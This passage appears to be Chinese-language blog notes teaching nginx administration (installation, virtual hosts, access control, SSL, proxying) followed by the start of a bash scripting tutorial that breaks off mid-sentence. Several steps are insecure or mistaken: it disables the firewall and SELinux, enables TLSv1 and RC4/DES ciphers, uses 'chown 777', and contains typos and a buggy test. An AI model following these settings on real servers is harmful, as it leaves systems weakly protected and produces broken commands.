2）基础模块： HTTP Access模块、HTTP FastCGI模块、HTTP Proxy模块和HTTP Rewrite模块 3）第三方模块： HTTP Upstream Request Hash模块、Notice模块和HTTP Access Key模块及用 户自己开发的模块 #Nginx的启动、关闭和平滑重启 Nginx基本信息检查 检查Nginx配置文件的正确性 nginx -t 用于检查配置文件是否正确，但并不执行 nginx -t -c /opt/nginx/conf/nginx.conf -c参数用于指定配置文件路径，不指定则会自动在安装路径查找 显示Nginx的版本以及相关编译信息 nginx -v 显示安装Nginx的版本信息 nginx -V 显示安装的Nginx版本和相关编译信息 启动、关闭与重启Nginx对进程的控制能力非常强大，可以通过信号指令控制进程 QUIT，表示处理完当前请求后，关闭进程 HUP，表示重新加载配置，也就是关闭原有的进程，并开启新的工作进程，此操作不会中断用户的访问请求，可以平滑重启 USR1，用于Nginx的日志切换，也就是重新打开一个日志文件，如每天生成一个新的日志文件 USR2，用于平滑升级可执行程序 WINCH，从容关闭工作进程 启动 /opt/nginx/sbin/nginx 或 ln -s /opt/nginx/sbin/nginx /usr/bin nginx 关闭 kill -XXX pid XXX 信号名 pid Nginx的进程号 123[root@ ~]# ps -ef | grep &quot;nginx: master process&quot; | grep -v &quot;grep&quot; | awk -F ' ' '{print $2}'[root@ ~]# cat /apps/nginx/logs/nginx.pid 3413 pkill nginx 平滑重启 kill -HUP 'cat /opt/nginx/logs/nginx.pid' Nginx架构和进程Nginx架构Nginx服务部署安装yum安装 yum安装，安装前需要先安装扩展源 12[root@VM-12-6-centos ~]# yum install -y epel-release.noarch[root@VM-12-6-centos ~]# yum install -y nginx 启动nginx 12[root@VM-12-6-centos ~]# systemctl start nginx.service[root@VM-12-6-centos ~]# systemctl status nginx.service 123456/usr/sbin/nginx重启：nginx -s reload关闭：nginx -s stop不能混合使用pkill nginx 关闭防火墙和selinux 12systemctl stop firewalld.servicesetenforce 0 编译安装 从官网获取源码包，以1.18.0举例 12345678910111213[root@iZbp12kxoeviin351al5daZ opt]# wget http://nginx.org/download/nginx-1.18.0.tar.gz -P /opt[root@iZbp12kxoeviin351al5daZ opt]# tar -zxvf nginx-1.18.0.tar.gz [root@iZbp12kxoeviin351al5daZ nginx-1.18.0]# ./configure --help========================可能会报错，缺少pcre包./configure --without-http_rewrite_module========================安装lrzsz可以实现直接将.tar.gz格式的文件拖如xshell的窗口内就会自动上传rz，sz是Linux/Unix同Windows进行ZModem文件传输的命令行工具。rz 可以很方便的从客户端传文件到服务器，sz也可以很方便的从服务器传文件到客户端======================== 编译安装pcre-devel 1234567891011[root@iZbp12kxoeviin351al5daZ opt]# cd pcre-8.02[root@iZbp12kxoeviin351al5daZ pcre-8.02]# ./configure[root@iZbp12kxoeviin351al5daZ pcre-8.02]# nake[root@iZbp12kxoeviin351al5daZ pcre-8.02]# nake install=====================中间报错可以安装gcc=====================报错后安装yum -y install gcc+ gcc-c++=====================再报错make clean yum安装依赖 gcc pcre-devel openssl-devel zlib-devel 1[root@iZbp12kxoeviin351al5daZ nginx-1.18.0]# yum -y install gcc pcre-devel openssl-devel 添加nginx用户并禁止登录 1[root@iZbp12kxoeviin351al5daZ nginx-1.18.0]# useradd -r -s /sbin/nologin nginx 编译安装 12345678910111213141516[root@iZbp12kxoeviin351al5daZ nginx-1.18.0]# ./configure --prefix=/apps/nginx \\--user=nginx \\--group=nginx \\--with-http_ssl_module \\--with-http_v2_module \\--with-http_realip_module \\--with-http_stub_status_module \\--with-http_gzip_static_module \\--with-pcre \\--with-stream \\--with-stream_ssl_module \\--with-stream_realip_module[root@iZbp12kxoeviin351al5daZ nginx-1.18.0]# make -j 2 &amp;&amp; make install[root@iZbp12kxoeviin351al5daZ nginx-1.18.0]# chown -R nginx.nginx /apps/nginx[root@iZbp12kxoeviin351al5daZ nginx-1.18.0]# ln -s /apps/nginx/sbin/nginx /usr/bin/[root@iZbp12kxoeviin351al5daZ nginx-1.18.0]# nginx -v nginx完成安装以后，有四个主要的目录 conf：保存nginx所有的配置文件，其中nginx.conf是nginx服务器的最核心最主要的配置文件，其他的.conf则是用来配置nginx相关的功能的。例如fastcgi功能使用的是fastcgi. conf和 fastcgi.params两个文件，配置文件一般都有个样板配置文件，是文件名. default结尾，使用 的使用将其复制为并将default去掉即可。 html：目录中保存了nginx服务器的web文件，但是可以更改为其他目录保存web文件，另外还有一个50x的web文件时默认的错误页面提示页面 logs：用来保存nginx服务器的访问日志错误日志等日志，logs目录可以放在其他路径，比如/var/logs/nginx里面 sbin：保存nginx二进制启动脚本，可以接收不同的参数以实现不同的功能 1234567891011121314151617181920212223242526[root@iZbp12kxoeviin351al5daZ nginx]# tree.├── conf│ ├── fastcgi.conf│ ├── fastcgi.conf.default│ ├── fastcgi_params│ ├── fastcgi_params.default│ ├── koi-utf│ ├── koi-win│ ├── mime.types│ ├── mime.types.default│ ├── nginx.conf│ ├── nginx.conf.default│ ├── scgi_params│ ├── scgi_params.default│ ├── uwsgi_params│ ├── uwsgi_params.default│ └── win-utf├── html│ ├── 50x.html│ └── index.html├── logs└── sbin └── nginx4 directories, 18 files 结构介绍配置文件配置文件结构： 位置：Nginx安装目录的conf目录下，以block的形式组织 main指令位于最高层，main下面有Events、HTTP等层级，HTTP层中又包含server层，即server block，server block中可以分为location层，并且可以有多个 配置文件部分： main（全局设置）设置的指令将影响其他所有设置 server（主机设置）主要用于指定主机和端口 upstream（负载均衡服务器设置），设置一系列的后端服务器 location（URL匹配特定位置的设置），用于匹配网页位置 四者关系：server继承main，location继承server，upstream既不会继承其他设置也不会被继承 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849[root@VM-12-6-centos nginx]# cp nginx.conf{,.bak}[root@VM-12-6-centos nginx]# grep -Ev &quot;#|^$&quot; /etc/nginx/nginx.conf.bak &gt; /etc/nginx/nginx.conf[root@VM-12-6-centos nginx]# cat /etc/nginx/nginx.conf.bak | grep -Ev &quot;#|^$&quot;=====================第一个部分，配置文件的主区域===main模块=============user nginx; # 定义worker进程的管理用户worker_processes auto; # 定义worker进程数，auto会自动调整为CPU核数error_log /var/log/nginx/error.log; # 定义错误日志pid /run/nginx.pid; # 定义pid文件，进程id的存储文件位置include /usr/share/nginx/modules/*.conf; =====================第二个部分，配置文件的事件区域==多进程多线程=========events { use epoll; # 事件模块指令，指定Nginx工作模式，epoll高效模式，select、poll标准模式 worker_connections 1024;}# 一个worker进程最大能够处理的请求数 # 定义一个worker进程可以同时接受1024个请求=====================第三个部分，配置文件的http区域====================http { log_format main '$remote_addr - $remote_user [$time_local] &quot;$request&quot; ' '$status $body_bytes_sent &quot;$http_referer&quot; ' '&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;'; # 定义日志格式 main为日志格式名称，可以在access_log中引用 access_log /var/log/nginx/access.log main; # 指定日志文件路径 sendfile on; # 允许sendfile方式传输文件 ，sendfile系统调用在两个文件描述符之间直接传递数据(完全在内核中操作)，从而避免了数据在内核缓冲区和用户缓冲区之间的拷贝，操作效率很高，被称之为零拷贝。 tcp_nopush on;# 在sendfile启动下，使用TCP_CORK套接字，当有数据时，先别着急发送, 确保数据包已经装满数据, 避免了网络拥塞 tcp_nodelay on; # 接连接保持活动状态，有数据包就发，二选一 keepalive_timeout 65; # 超时时间 types_hash_max_size 4096; # 连接超时时间 include /etc/nginx/mime.types; # 文件扩展名与文件类型映射表 default_type application/octet-stream; # 默认文件类型，默认为text/plain include /etc/nginx/conf.d/*.conf; server { # 虚拟主机配置 listen 80; # 指定监听的端口 listen [::]:80; server_name _; # 指定网站主机名，ip地址或域名 root /usr/share/nginx/html; # 定义站点目录的位置 include /etc/nginx/default.d/*.conf; # 定义首页文件 error_page 404 /404.html; location = /404.html { } error_page 500 502 503 504 /50x.html; location = /50x.html { } }} log_format日志格式说明12345678$remote_addr与$http_x_forwarded_for：用以记录客户端的ip地址$remote_user：用来记录客户端用户名称$time_local：用来记录访问时间与时区$request：用来记录请求的url与HTTP协议$status：用来记录请求状态；成功是200$body_bytes_sent：记录发送给客户端文件主体内容大小$http_referer：用来记录从哪个页面链接访问过来的$http_user_agent：记录客户端浏览器的相关信息 ##location表达式 ~表示执行一个正则匹配，区分大小写 ~*表示执行一个正则匹配，不区分大小写 ^~表示普通字符匹配。使用前缀匹配，如果匹配成功，则不再匹配其他location =进行普通字符精准匹配，也就是完全匹配 @它定义一个命名的location，使用在内部定向时，例如error_page，try_files 优先级：=/^/,~*/常规字符串 12345678910111213141516171819202122location = / {[ configuration A ]}location / {[ configuration B ]expires 30d; # 指定静态资源的过期时间}location /documents/ {[ configuration C ]}location ^~ /images/ {[ configuration D ]}location ~* \\.(gif|jpg|jpeg)$ {[ configuration E ]}A：请求 /B: 请求 index.htmlC: 请求 /documents/document.htmlD: 请求 /images/1.jpgE: 请求 /documents/document.gif 客户端相关配置123456789keepalive_timeout # 保持连接的超时时长keepalive_requests # 一次连接允许请求资源的最大数量keepalive_disable # 对某种浏览器禁用长连接send_timeout # 向客户端发送响应报文的超时时长client_body_buffer_size # 接收客户端请求报文的body部分的缓冲区大小client_body_temp_path# 设定用于存储客户端请求报文的body部分的临时存储路径及子目录结构和数量limit_rate # 限制响应给客户端的传输速率limit_except # 限制对指定的请求方法之外的其它方法的使用客户端 日志切割 /etc/logrotate.d/nginx：可以实现日志切割 日志切割方式一 mv /var/log/nginx/access.log /var/log/nginx/access_$(date +%F).log 重启nginx systemctl restart nginx 可以写入脚本并进行日志轮询 日志切割方式二，使用专用的文件切割程序–logrotate 12345678910111213141516171819202122232425262728[root@localhost logrotate.d]# cat /etc/logrotate.conf# see &quot;man logrotate&quot; for details# rotate log files weeklyweekly # 定义默认日志切割周期# keep 4 weeks worth of backlogsrotate 4 # 定义只保留几个切割后的文件# create new (empty) log files after rotating old onescreate # 切割后创建出一个相同的源文件，后面可以跟上文件权限、属主、属组# use date as a suffix of the rotated filedateext # 定义角标，扩展名称信息# uncomment this if you want your log files compressed#compress # 是否对切割后的文件进行压缩处理# RPM packages drop log rotation information into this directoryinclude /etc/logrotate.d# no packages own wtmp and btmp -- we'll rotate them here/var/log/wtmp { # 当都对某个文件进行切割配置monthlycreate 0664 root utmpminsize 1Mrotate 1}/var/log/btmp {missingokmonthlycreate 0600 root utmprotate 1} 搭建一个网站 编写虚拟主机配置文件 12345678910[root@VM-12-6-centos nginx]# cd conf.d/[root@VM-12-6-centos conf.d]# vim www.confserver{ listen *:8080; server_name www.xkxk.com; location / { root /usr/share/nginx/html; index xkxk.html;}} 编写网站代码 12[root@VM-12-6-centos nginx]# vim xkxk.htmlOK啦，好兄弟！ 赋予网站代码权限 1[root@VM-12-6-centos nginx]# chown 777 xkxk.html 编写hosts文件，做好域名解析((如果windows需要访问也要在这个目录下的hosts文件做相同操作 C:\\Windows\\System32\\drivers\\etc) 123[root@VM-12-6-centos conf.d]# vim /etc/hosts101.43.86.75 www.xkxk.com 重启nginx服务(使用reload平滑重启，以下两种方式不能混用) 12[root@VM-12-6-centos conf.d]# systemctl reload nginx.service[root@VM-12-6-centos conf.d]# nginx -s reload 访问测试 1234567root@VM-12-6-centos conf.d]# ss -tnlState Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 128 *:8080 *:* LISTEN 0 128 *:80 *:* [root@VM-12-6-centos conf.d]# curl www.xkxk.com:8080OK啦，好兄弟！ 搭建多个网站 准备好配置文件 123456789101112131415161718192021222324252627282930[root@VM-12-6-centos conf.d]# ll总用量 12-rw-r--r--. 1 root root 107 9月 25 16:45 bbs.conf-rw-r--r--. 1 root root 109 9月 25 16:45 blog.conf-rw-r--r--. 1 root root 107 9月 25 16:44 www.conf[root@VM-12-6-centos conf.d]# cat *.confserver {listen *:8080;server_name bbs.eagle.com;location / {root /html/bbs;index index.html;}}server {listen *:8080;server_name blog.eagle.com;location / {root /html/blog;index index.html;}}server {listen *:8080;server_name www.eagle.com;location / {root /html/www;index index.html;}} 准备站点目录以及首页文件 12[root@VM-12-6-centos conf.d]# mkdir -p /html/{www,bbs,blog}[root@VM-12-6-centos conf.d]# for name in {www,bbs,blog};do echo &quot;&lt;h1&gt; $name &lt;/h1&gt;&quot; &gt;/html/$name/index.html;done; 重启nginx 11 [root@VM-12-6-centos conf.d]# systemctl reload nginx.service 访问测试 123[root@VM-12-6-centos conf.d]# curl www.eagle.com:8080&lt;h1&gt; www &lt;/h1&gt;[root@VM-12-6-centos conf.d]# curl bbs.eagle.com:8080&lt;h1&gt; bbs &lt;/h1&gt;[root@VM-12-6-centos conf.d]# curl blog.eagle.com:8080&lt;h1&gt; blog &lt;/h1&gt; Nginx相关模块 核心模块 基础模块 第三方模块 https://nginx.org/en/docs/ 模块参考 ngx_http_access_module 实现基于ip的访问控制功能 代码实例 12345678server{ ... deny 192.168.1.1; allow 192.168.1.0/24; allow 10.1.1.0/16; allow 2001:0db8::/32; deny all;} ngx_http_auth_basic_module 使用基于用户的访问控制，使用basic机制进行用户认证 代码实例 123456location / { auth_basic &quot;closed site&quot; auth_basic_user_file conf/htpasswd;}htpasswd -bc /etc/nginx/conf/htpasswd admin 123546将文件权限改为600观察现象 htpasswd工具介绍 yum install httpd-tools.x86_64 -y -c：创建一个密码文件 -n：不会更新文件，显示文件内容信息 -b：免交互式输入用户密码信息 -l：读取密码采用标准输入方式，并不做检查 -m：使用md5的加密算法 -B：使用bcrypt对密码进行加密 -C：使用bcrypt algorithm对密码进行加密 -d：密码加密方式 -s：加密方式 -P：不进行加密 -D：删除指定用户 ngx_httpd_stub_startus_module模块获取Nginx自上次启动以来的工作状态，非核心模块，需要在Nginx编译安装时手工指定 相关日志的设置 代码实例 123456789101112131415log_format compression '$remote_addr - $remote_user [$time_local] ''&quot;$request&quot; $status $bytes_sent ''&quot;$http_referer&quot; &quot;$http_user_agent&quot; &quot;$gzip_ratio&quot;';access_log /spool/logs/nginx-access.log compression buffer=32k;# 以下指令指定启用获取Nginx工作状态的功能location /NginxStatus { stub_status on; access_log logs/NginxStatus.log; # 指定该模块的访问日志文件 auth_basic &quot;NginxStatus&quot;; # Nginx的一种认证机制 auth_basic_user_file ../htpasswd; # 用来指定认证的密码文件 ngx_http_auth_basic_module模块} ngx_http_gzip_module模块 使用gzip方式压缩响应的过滤器 代码实例 12345678gzip on;gzip_min_length 1000;gzip_buffers 4 16k; # 申请4个单位为16K的内存作为压缩结果流缓存gzip_http_version # 用于设置识别HTTP协议版本，默认是1.1gzip_comp_level # 用来指定gzip压缩比，1压缩比最小，处理速度最快 gzip_proxied expired no-cache no-store private auth;gzip_types text/plain application/xml; # 用于指定压缩的类型 text/html必定会压缩gzip_vary # 可以让前端的缓存服务器缓存经过gzip压缩的页面 ngx_http_ssl_module模块 定义HTTPS的相关配置 代码实例 12345678910111213http {... server { listen 443 ssl; keepalive_timeout 70; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers AES128-SHA:AES256-SHA:RC4-SHA:DES-CBC3-SHA:RC4-MD5; ssl_certificate /usr/local/nginx/conf/cert.pem; ssl_certificate_key /usr/local/nginx/conf/cert.key; ssl_session_cache shared:SSL:10m; ssl_session_timeout 10m; ... } 自签名证书 生成ca证书 1234cd /apps/nginxmkdir certs &amp;&amp; cd certsopenssl req -newkey rsa:4096 -nodes -sha256 -keyout ca.key -x509 -days 3650 -out ca.crt 生成证书请求文件 12openssl req -newkey rsa:4096 -nodes -sha256 -keyout iproute.cn.key -outiproute.cn.csr 签发证书 123openssl x509 -req -days 36500 -in iproute.cn.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out iproute.cn.crtcat iproute.cn.crt ca.crt &gt; iproute.crt 验证证书内容 1openssl x509 -in iproute.cn.crt -noout -text Nginx证书配置123456789server { listen 80; listen 443 ssl; ssl_certificate /apps/nginx/certs/iproute.crt; ssl_certificate_key /apps/nginx/certs/iproute.cn.key; ssl_session_cache shared:sslcache:20m; ssl_session_timeout 10m; root /data/nginx/html;} ngx_http_rewrite_module模块 将用户请求的URL基于regex所描述的模式进行检查，而后完成替换 ngx_http_referer_module模块 定义referer首部的合法可用值 Nginx代理介绍反向代理（Reverse Proxy）方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内 部网络上的服务 器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器 对外就表现为一个反向代理服务 器，通常使用到的http/https协议和fastgci（将动态内容和http服务器 分离） 代理相关模块及配置 nginx代理基于ngx_http_proxy_module模块的功能，该模块有很多配置指令： 正向代理 resolver：指定dns服务器地址 proxy_pass：代理到的地址 resolver_timeout：dns解析超时时长 案例 添加配置文件 12345678[root@VM-12-6-centos ~]# cat /etc/nginx/conf.d/www.confserver{ listen *:8090; resolver 114.114.114.114; location / { proxy_pass http://$http_host$request_uri; }} 重启nginx 测试 方法一： 123456789101112[root@VM-12-6-centost ~]# curl -x 192.168.80.10:8090 &quot;http://www.baidu.com&quot; -IHTTP/1.1 200 OKServer: nginx/1.20.1Date: Wed, 21 Jul 2021 06:16:29 GMTContent-Type: text/htmlContent-Length: 277Connection: keep-aliveAccept-Ranges: bytesCache-Control: private, no-cache, no-store, proxy-revalidate, no-transformEtag: &quot;575e1f60-115&quot;Last-Modified: Mon, 13 Jun 2016 02:50:08 GMTPragma: no-cache 方法二； 1[root@VM-12-6-centost ~]# export http_proxy=http://192.168.80.10:8090 ##反向代理相关指令 1.proxy_pass指令 123456Syntax: proxy_pass URL;Default: —Context: location, if in location, limit_excepthttp://localhost:8000/uri/http://192.168.56.11:8000/uri/http://unix:/tmp/backend.socket:/uri/ 其中，URL为要设置的被代理服务器的地址，包含传输协议、主机名称或ip地址+端口号等元素。当URL 中不包含URI时，nginx服务器将不改变源地址中的URI，当URL中包含URI时，服务器将会改变源地址中 的URI； 2.proxy_set_header指令 1234567891011Syntax: proxy_set_header field value;Default: proxy_set_header Host $proxy_host;proxy_set_header Connection close;Context: http, server, location# 用户请求的时候HOST的值是www.eagleslab.com, 那么代理服务会像后端传递请求的还是eagleslabproxy_set_header Host $http_host;# 将$remote_addr的值放进变量X-Real-IP中，$remote_addr的值为客户端的ipproxy_set_header X-Real-IP $remote_addr;# 客户端通过代理服务访问后端服务, 后端服务通过该变量会记录真实客户端地址proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; 该指令可以更改nginx服务器接收到的客户端请求的请求头信息，然后将新的请求头发送给被代理的服务 器 3.proxy_connect_timeout 123Syntax: proxy_connect_timeout time;Default: proxy_connect_timeout 60s;Context: http, server, location 该指令配置nginx服务器与后端被代理服务器尝试建立连接的超时时间 4.proxy_read_timeout 123Syntax: proxy_read_timeout time;Default: proxy_read_timeout 60s;Context: http, server, location 该指令配置nginx服务器向后端被代理服务器发出read请求后，等待响应的超时时间 5.proxy_send_timeout 123Syntax: proxy_send_timeout time;Default: proxy_send_timeout 60s;Context: http, server, location 该指令配置nginx服务器向后端被代理服务器发出write请求后，等待响应的超时时间 6.proxy_buffering 123Syntax: proxy_buffering on | off;Default: proxy_buffering on;Context: http, server, location 该指令nginx会把后端返回的内容先放到缓冲区当中，然后再返回给客户端，边收边传，不是全部接收完 再传给客户端 7.proxy_buffer_size 123Syntax: proxy_buffer_size size;Default: proxy_buffer_size 4k|8k;Context: http, server, location 该指令设置nginx代理保存用户头信息的缓冲区大小 8.proxy_buffers 缓冲区 123Syntax: proxy_buffers number size;Default: proxy_buffers 8 4k|8k;Context: http, server, location 以上是常见的代理配置指令，除此之外还有很多，诸位可以自行探究","link":"/2022/01/25/nginx/"},{"title":"shell编程","text":"shell 要求 复杂的脚本看懂大概，30%。简单的脚本会写！ shell编程怎么学 ①学习shell的语法和格式要求 ②使用shell的语法编写一个含有若干shell命令的脚本 ③使用shell命令解释器，执行shell脚本 shell是什么Linux操作系统的核心是kernal（内核）！ 当应用程序在执行时，需要调用计算机硬件的cpu,内存等资源！ 程序将指令发送给内核执行！ 为了防止程序发送一些恶意指令导致损坏内核，在内核和应用程序接口之间，设置一个中间层，称为shell! 12345678本质上来说： shell: 一个可以解释shell规定的语法命令的解释器！ 解释器负责将应用程序发送的指令，进行检查，合法后交给内核解释执行！返回结果！ shell命令： shell解释器要求的指定语法编写的命令！ shell脚本： 多条shell命令，可以编写在一个文件中，文件中的指令，可以按照顺序执行！ 将这个文件称为shell脚本！ shell中的解释器 使用 $SHELL变量查看当前系统默认的解释器类型！ 1234567shell支持多种不同风格的解释器，通过/etc/shells文件查看！默认使用 /bin/bash作为shell命令解释器！在终端中输入： cat /etc/shells等价于/bin/bash -c 'cat /etc/shells'.默认/bin/bash必须接一个脚本，作为输入！如果是一条命令，需要加-c （command） linux中的常用目录/bin: linux用户常用的命令 cd echo pwd /sbin（super user bin）: root用户(管理员)使用的常用命令！ 对整个机器的管理命令！ 开启网络服务： service network start 命令的执行-bash: faefaw: command not found ： 当前命令不在当前用户的环境变量！ 查看： echo $PATH 脚本的编写要求①声明： #!/bin/bash②正文： 必须是shell解释器能否解释的命令 脚本的执行 ① bash /sh + 脚本 特点： 新开一个bash执行脚本，一旦脚本执行完毕，bash自动关闭！ ② ./脚本，前提是当前用户对脚本有执行权限，使用当前默认的解释器执行脚本 特点： 新开一个bash执行脚本，一旦脚本执行完毕，bash自动关闭！ ③ source / . +脚本 使用当前默认的解释器执行脚本，并不要求当前用户对脚本有执行权限 特点： 在当前bash执行脚本 1234567891011121314151617181920212223[root@server1 myshells]# vim first.sh[root@server1 myshells]# bash first.sh /root/myshellshahaha[root@server1 myshells]# sh first.sh /root/myshellshahaha[root@server1 myshells]# ./first.sh-bash: ./first.sh: 权限不够[root@server1 myshells]# ll总用量 4-rw-r--r--. 1 root root 29 9月 21 10:12 first.sh[root@server1 myshells]# chmod u+x first.sh [root@server1 myshells]# ./first.sh/root/myshellshahaha[root@server1 myshells]# chmod u-x first.sh [root@server1 myshells]# source first.sh /root/myshellshahaha[root@server1 myshells]# . first.sh /root/myshellshahaha 变量操作变量定义规则 变量名称可以由字母、数字和下划线组成，但是不能以数字开头，环境变量名建议大写。 等号两侧不能有空格 在bash中，变量默认类型都是字符串类型，无法直接进行数值运算。 变量的值如果有空格，需要使用双引号或单引号括起来。 使用双引号，可以识别空格之外的其他变量，使用单引号则会只会忽略空格！ 使用反引号，可以将语句运行的结果作为值赋值给变量！ 基本操作 增： 变量名=变量值 删： unset 变量名 改： 变量名=变量值 查： echo $变量名 查看当前bash所有定义的变量： set 2.关键字特殊关键字： readonly : 用来修饰一个只读(不能修改，删除)变量！ export: 导出！将一个变量提升为全局变量！ 局部变量： 默认变量只在定义变量的bash中有效！ 如果希望在bash-a访问bash-b中定义的变量！ 要求： ①bash-b不能关闭 ②让bash-b将变量提升为全局变量， 才能访问到！ 12345678910111213141516171819202122232425262728[root@server1 myshells]# pstree ├─sshd─┬─sshd───bash─┬─cat │ └─pstree └─sshd───bash[root@server1 myshells]# echo $a[root@server1 myshells]# vim secomd.sh[root@server1 myshells]# bash secomd.sh ├─sshd─┬─sshd───bash─┬─bash───sleep │ └─cat └─sshd───bash───pstree[root@server1 myshells]# b=10[root@server1 myshells]# echo $b10[root@server1 myshells]# cp second.sh third.sh#! /bin/bashpwdecho $becho hahahha[root@server1 myshells]# bash third.sh /root/myshellshahahha[root@server1 myshells]# export b[root@server1 myshells]# bash third.sh /root/myshells10hahahha 注意： ①变量赋值时，值全部以字符串存在，无法进行运算！②赋值的值中有空格，需要使用引号引起来 单引号： 不能识别$等特殊字符,不能脱义 双引号： 可以脱义$③``,作用是将引号中的命令执行的结果赋值给变量 命令 等价于 $(命令) 对象0X1234 B{String name=”jack”}对象A｛ B b=0X1234 void hello(){ sysout(B.name) } ｝ 3.变量的生命周期： 在第一次新增时产生 变量在执行unset时，撤销，失效！ 关闭当前bash，所有定义的变量也不会存在 4.特殊变量 $?: 上一条命令的返回值！在bash中，如果返回值为0，代表上一条命令执行成功！ $#: 参数个数 $: 参数列表。 在使用 “$“时，将整个参数列表作为一个元素！ $@: 参数列表 $0-n: $0:脚本名 $1-$n: 第n个参数 获取第10以上的参数，${n} 12345678910111213141516171819202122232425262728293031323334353637383940[root@server1 myshells]# jkhrebti-bash: jkhrebti: 未找到命令[root@server1 myshells]# $?-bash: 127: 未找到命令[root@server1 myshells]# vim fourth.shecho '$0'echo $0echo '$1'echo $1echo '$2'echo $2echo '$#'echo $#echo '$*'echo $*echo '$@'echo $@echo '${11}'echo $11echo 'sdav'echo '${11}'echo ${11}[root@server1 myshells]# bash fourth.sh 1 2 3 4 5 6 7 8 9 10 11$0fourth.sh$11$22$#11$*1 2 3 4 5 6 7 8 9 10 11$@1 2 3 4 5 6 7 8 9 10 11${11}11sdav${11}11 运算符1．基本语法 （1）“$((运算式))”或“$[运算式]” （2）expr + , - , *, /, % 加，减，乘，除，取余 注意：expr运算符间要有空格; *号需要转义为\\*，否则会被视为通配符； 运算指的都是整数的运算，浮点运算需要借助其他的命令！ 2．案例实操： 123456789101112131415161718192021[root@server1 myshells]# num = $((2+2))-bash: num: 未找到命令[root@server1 myshells]# num=$((2+2))[root@server1 myshells]# echo $num4[root@server1 myshells]# num1=$[2+2][root@server1 myshells]# echo $num14[root@server1 myshells]# expr 1 + 12[root@server1 myshells]# expr `expr 1 + 1` \\* 24[root@server1 myshells]# expr $(expr `expr 1 + 1` \\* 2) \\* 28[root@server1 myshells]# expr $(expr $(expr `expr 1 + 1` \\* 2) \\* 2) / 24[root@server1 myshells]# S=$[(2+3)*4][root@server1 myshells]# echo $S20[root@server1 myshells]# expr $[(2+3)*4]20 条件判断1．基本语法 [ condition ]（注意condition前后要有空格） 注意：条件非空即为true，[ atguigu ]返回true，[] 返回false。 \\2. 常用判断条件 （1）两个整数之间比较 = 字符串比较 -lt 小于（less than） -le 小于等于（less equal） -eq 等于（equal） -gt 大于（greater than） -ge 大于等于（greater equal） -ne 不等于（Not equal） （2）按照文件权限进行判断 -r 有读的权限（read） -w 有写的权限（write） -x 有执行的权限（execute） （3）按照文件类型进行判断 -f 文件存在并且是一个常规的文件（file） -e 文件存在（existence） -d 文件存在并是一个目录（directory） -s 文件存在且不为空 -L 文件存在且是一个链接(link) 123456789101112131415161718192021222324252627282930313233343536373839404142434445[root@server1 myshells]# [ 1=2 ][root@server1 myshells]# $?-bash: 0: 未找到命令[root@server1 myshells]# [ 1 = 2 ][root@server1 myshells]# $?-bash: 1: 未找到命令[root@server1 myshells]# [ '' ][root@server1 myshells]# $?-bash: 1: 未找到命令[root@server1 myshells]# [ ' ' ][root@server1 myshells]# $?-bash: 0: 未找到命令[root@server1 myshells]# [-r first.sh ]-bash: [-r: 未找到命令[root@server1 myshells]# [ -r first.sh ][root@server1 myshells]# $?-bash: 0: 未找到命令[root@server1 myshells]# [ -w first.sh ][root@server1 myshells]# $?-bash: 0: 未找到命令[root@server1 myshells]# [ -x first.sh ][root@server1 myshells]# $?-bash: 1: 未找到命令[root@server1 myshells]# [ -e first.sh ][root@server1 myshells]# $?-bash: 0: 未找到命令[root@server1 myshells]# [ -e firstds.sh ][root@server1 myshells]# $?-bash: 1: 未找到命令[root@server1 myshells]# [ -f firstds.sh ][root@server1 myshells]# $?-bash: 1: 未找到命令[root@server1 myshells]# [ -f first.sh ][root@server1 myshells]# $?-bash: 0: 未找到命令[root@server1 myshells]# mkdirmkdir: 缺少操作数Try 'mkdir --help' for more information.[root@server1 myshells]# mkdir test[root@server1 myshells]# [ -d test/ ][root@server1 myshells]# $?-bash: 0: 未找到命令[root@server1 myshells]# [ -f test/ ][root@server1 myshells]# $?-bash: 1: 未找到命令 （1）23是否大于等于22 123[root@server1 myshells]# [ 23 -ge 22 ][root@server1 myshells]# echo $?0 （2）helloworld.sh是否具有写权限 123[root@server1 myshells]# [ -w helloworld.sh ][root@server1 myshells]# echo $?0 （3）多条件判断（&amp;&amp; 表示前一条命令执行成功时，才执行后一条命令，|| 表示上一条命令执行失败后，才执行下一条命令） 1234[root@server1 myshells]# [ condition ] &amp;&amp; echo OK || echo notokOK[root@server1 myshells]# [ condition ] &amp;&amp; [ ] || echo notoknotok 流程控制if1．基本语法 if [ 条件判断式 ] then 程序 elif 条件判断式 ​ then 程序.. else 程序.. fi 或 if [ 条件判断式 ] ; then 程序.. elif [条件判断式] ; then 程序.. else 程序 fi ​ 注意事项： （1）[ 条件判断式 ]，中括号和条件判断式之间必须有空格 （2）if后要有空格 123456789101112131415#!/bin/bash#判断用户输入的参数是否是1，如果是1，打印用户输入的是1，是2打印2，是3打印3，不是123则输出用户输入的参数不是123if [ $1==1 ]; then echo 用户输入的参数是1 elif [ $1 -eq 2 ]then echo 用户输入的参数是2 elif [ $1 -eq 3 ]then echo 用户输入的参数是3else echo 用户输入的参数不是123fi case1．基本语法 case $变量名 in “值1”） 如果变量的值等于值1，则执行程序1 ;; “值2”） 如果变量的值等于值2，则执行程序2 ;; …省略其他分支… *） 如果变量的值都不是以上的值，则执行此程序 ;; esac 注意事项： \\1) case行尾必须为单词“in”，每一个模式匹配必须以右括号“）”结束。 \\2) 双分号“**;;**”表示命令序列结束，相当于java中的break。 \\3) 最后的“*）”表示默认模式，相当于java中的default。 12345678910111213[root@server1 myshells]# vim case.sh#!/bin/bash#判断用户输入的参数是否是guest，是guest，输出欢迎光临，&gt;是admin输出欢迎管理员，否则输出不欢迎case $1 inguest) echo '欢迎光临' ;;admin) echo 欢迎管理员! ;;*) echo 不欢迎！;;esac[root@server1 myshells]# bash case.sh IAUDEHS不欢迎！ forfor (( 初始值;循环控制条件;变量变化 )) do 程序 done 或 for (( 初始值;循环控制条件;变量变化 )); do 程序; done 1234567891011[root@server1 myshells]# vim for1.sh#!/bin/bash#统计1-100之间的和sum=0for((i=1;i&lt;=100;i++))do sum=$[$sum+$i]doneecho 1-100之间的和是:$sum[root@server1 myshells]# bash for1.sh 1-100之间的和是:5050 foreach增强循环 for 变量 in 值1 